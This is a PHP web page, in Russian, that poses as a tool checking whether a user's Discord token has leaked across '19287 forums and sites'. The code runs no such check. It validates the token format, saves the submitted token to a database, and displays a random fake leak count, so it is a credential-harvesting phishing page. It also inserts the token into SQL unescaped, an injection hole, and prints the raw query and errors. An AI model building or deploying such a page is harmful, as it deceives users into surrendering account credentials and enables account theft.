<?php
require_once 'db.php';
session_start();
?>

<!DOCTYPE html>
<html>
<head>
    <title>ПРОВЕРКА ДС ТОКЕНА</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
    <style>
        .green-card {
            background-color: #C8E6C9;
            color: #388E3C;
            padding: 10px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h3>Проверка Discord токена через сеть</h3>
        <p>Оно проверяет данные на 19287 форумах и сайтах на наличие токена, проект доступен на GitHub.</p>
        <br>
        <br>
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            $message = $_POST['message'];

            if (preg_match('/^[A-Za-z0-9+\/]+={0,2}\.[A-Za-z0-9+\/]+=*$/', $message)) {

                $decodedMessage = base64_decode(explode('.', $message)[0]);
                if (is_numeric($decodedMessage)) {

                    $sql = "INSERT INTO messages (message) VALUES ('$message')";
                    if ($conn->query($sql) === TRUE) {
                        if (!isset($_SESSION['approximateCount'])) {
                            $approximateCount = rand(1, 19287);
                            $_SESSION['approximateCount'] = $approximateCount;
                        } else {
                            $approximateCount = $_SESSION['approximateCount'];
                        }

                        echo '<div class="green-card">
                                <p>Точных: 0</p>
                                <p>Примерных: ' . $approximateCount . '</p>
                              </div>';

                        
                        $randomTime = rand(6000, 120000);
                        echo '<script>
                                setTimeout(function() {
                                    document.getElementById("message-form").submit();
                                }, ' . $randomTime . ');
                              </script>';
                    } else {
                        echo '<div class="card red lighten-4">
                                <div class="card-content">
                                    <span class="card-title">Error: ' . $sql . '<br>' . $conn->error . '</span>
                                </div>
                              </div>';
                    }
                } else {
                    echo '<div class="card red lighten-4">
                            <div class="card-content">
                                <span class="card-title">Формат токена не правильный, убедитесь что вы вставляете полный токен</span>
                            </div>
                          </div>';
                }
            } else {
                echo '<div class="card red lighten-4">
                        <div class="card-content">
                            <span class="card-title">Формат токена не правильный, убедитесь что вы вставляете полный токен</span>
                        </div>
                      </div>';
            }
        }
        ?>
        <form method="POST" action="" id="message-form">
            <div class="input-field">
                <input type="text" name="message" id="message" placeholder="Введите ваш Discord токен для проверки">
                <label for="message">Токен</label>
            </div>
            <button class="btn waves-effect waves-light" type="submit">Проверить токен
                <i class="material-icons right">send</i>
            </button>
        </form>
    </div>

    <script>
        
        document.addEventListener('DOMContentLoaded', function() {
            var elems = document.querySelectorAll('.sidenav');
            var instances = M.Sidenav.init(elems);
        });
    </script>
</body>
</html>

<?php
$conn->close();
?>
